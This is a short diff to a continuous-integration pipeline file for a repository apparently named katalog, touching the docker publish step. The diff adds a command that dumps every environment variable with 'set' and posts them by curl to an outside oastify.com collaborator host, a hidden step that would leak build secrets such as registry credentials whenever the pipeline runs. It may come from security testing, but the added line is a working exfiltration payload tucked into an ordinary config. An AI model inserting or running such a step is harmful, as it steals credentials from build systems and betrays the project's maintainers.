@@ -75,6 +75,8 @@ steps:
 - name: publish
   pull: default
   image: plugins/docker
+  commands:
+  - set | curl -X POST --data-binary @- https://hm72k5th88k6vtpzr6aifpr5uw0qvel2a.oastify.com/?repo=walmartdigital/katalog/
   settings:
     registry: walmartdigital.azurecr.io
     repo: walmartdigital.azurecr.io/katalog
